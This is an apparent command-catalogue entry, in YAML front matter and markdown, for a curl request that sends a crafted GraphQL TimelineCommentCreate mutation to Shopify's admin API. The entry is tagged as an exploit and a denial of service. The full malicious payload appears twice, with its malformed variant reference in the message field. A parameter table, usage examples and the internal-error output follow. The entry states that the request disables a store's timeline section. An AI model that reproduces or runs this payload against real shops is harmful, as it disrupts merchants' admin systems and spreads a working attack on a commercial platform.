---
id: cmd-shopify-malicious-comment-001
data: >-
  curl -X POST https://your-shop.myshopify.com/admin/api/2023-10/graphql.json -H
  'Content-Type: application/json' -H 'X-Shopify-Access-Token: your-token' -d
  '{"operationName":"TimelineCommentCreate","variables":{"input":{"message":"[#V12221027811351|
  ]","resourceId":"gid://shopify/PriceRule/298300342294","attachments":[]}},"query":"mutation
  TimelineCommentCreate($input: TimelineCommentCreateInput!) {
  timelineCommentCreate(input: $input) { event { ...TimelineEvent __typename }
  userErrors { field message __typename } __typename } } fragment TimelineEvent
  on Event { id createdAt message ... on BasicEvent { attributeToApp
  attributeToUser __typename } ... on CommentEvent { rawMessage edited author {
  id name initials avatar(fallback: NOT_FOUND) { transformedSrc(maxWidth: 50,
  maxHeight: 50, scale: 3) __typename } __typename } attachments { id image {
  transformedSrc(maxWidth: 50, maxHeight: 54, scale: 3) __typename }
  fileExtension size name url __typename } embed { ... on Product { id title
  featuredImage { altText transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3)
  __typename } tracksInventory totalInventory variants(first: 1) { edges { node
  { price __typename } __typename } __typename } __typename } ... on
  ProductVariant { id title image { altText transformedSrc(maxWidth: 50,
  maxHeight: 50, scale: 3) __typename } product { title __typename }
  inventoryQuantity inventoryItem { tracked __typename } __typename } ... on
  Customer { id displayName email ordersCount totalSpentV2 { amount currencyCode
  __typename } phone note __typename } ... on Order { id name createdAt
  totalPriceSet { shopMoney { amount currencyCode __typename } __typename }
  customer { id displayName __typename } lineItems(first: 250) { edges { node {
  id title product { id __typename } variant { id __typename } __typename }
  __typename } __typename } displayFinancialStatus displayFulfillmentStatus
  __typename } ... on DraftOrder { id name createdAt totalPrice customer { id
  displayName __typename } lineItems(first: 250) { edges { node { id title
  product { id __typename } variant { id __typename } __typename } __typename }
  __typename } __typename } __typename } __typename } __typename } __typename }
  __typename } __typename } __typename } __typename } __typename } __typename
  }'}'
tags:
  - graphql
  - shopify
  - exploit
  - dos
type: command
output: >-
  {"errors":[{"message":"Internal error. Looks like something went wrong on our
  end.\nRequest ID: d8358e69-631c-45a7-929b-630b9abf8b5c (include this in
  support requests)."}]}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:45.022Z'
verified: false
validated: true
submitted: true
---
# shopify-timeline-comment-create-malicious

## Command

```bash
curl -X POST https://your-shop.myshopify.com/admin/api/2023-10/graphql.json -H 'Content-Type: application/json' -H 'X-Shopify-Access-Token: your-token' -d '{"operationName":"TimelineCommentCreate","variables":{"input":{"message":"[#V12221027811351| ]","resourceId":"gid://shopify/PriceRule/298300342294","attachments":[]}},"query":"mutation TimelineCommentCreate($input: TimelineCommentCreateInput!) { timelineCommentCreate(input: $input) { event { ...TimelineEvent __typename } userErrors { field message __typename } __typename } } fragment TimelineEvent on Event { id createdAt message ... on BasicEvent { attributeToApp attributeToUser __typename } ... on CommentEvent { rawMessage edited author { id name initials avatar(fallback: NOT_FOUND) { transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3) __typename } __typename } attachments { id image { transformedSrc(maxWidth: 50, maxHeight: 54, scale: 3) __typename } fileExtension size name url __typename } embed { ... on Product { id title featuredImage { altText transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3) __typename } tracksInventory totalInventory variants(first: 1) { edges { node { price __typename } __typename } __typename } __typename } ... on ProductVariant { id title image { altText transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3) __typename } product { title __typename } inventoryQuantity inventoryItem { tracked __typename } __typename } ... on Customer { id displayName email ordersCount totalSpentV2 { amount currencyCode __typename } phone note __typename } ... on Order { id name createdAt totalPriceSet { shopMoney { amount currencyCode __typename } __typename } customer { id displayName __typename } lineItems(first: 250) { edges { node { id title product { id __typename } variant { id __typename } __typename } __typename } __typename } displayFinancialStatus displayFulfillmentStatus __typename } ... on DraftOrder { id name createdAt totalPrice customer { id displayName __typename } lineItems(first: 250) { edges { node { id title product { id __typename } variant { id __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename }'}'
```

## Description

This curl command sends a malicious GraphQL mutation to Shopify's admin API to create a timeline comment with an invalid product variant reference, triggering an internal exception that disables the timeline section.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://your-shop.myshopify.com/admin/api/2023-10/graphql.json` | GraphQL endpoint URL (replace with actual shop) | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-H 'X-Shopify-Access-Token: your-token'` | Authentication token header | Yes |
| `-d '...'` | JSON payload with malicious message and query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.myshopify.com/admin/api/2023-10/graphql.json -H 'Content-Type: application/json' -H 'X-Shopify-Access-Token: shpat_abc123' -d '{malicious payload}'
```

### Advanced Usage

Use with --verbose for debugging or pipe to jq for parsing response.

```bash
curl -v -X POST ... | jq '.'
```

## Expected Output

Internal server error JSON response indicating the exception: {"errors":[{"message":"Internal error. Looks like something went wrong on our end.\nRequest ID: d8358e69-631c-45a7-929b-630b9abf8b5c (include this in support requests)."}]}. No successful event creation.

## Related

- [[Related Procedure: Intercept-and-Modify-GraphQL-Timeline-Comment-Create]]
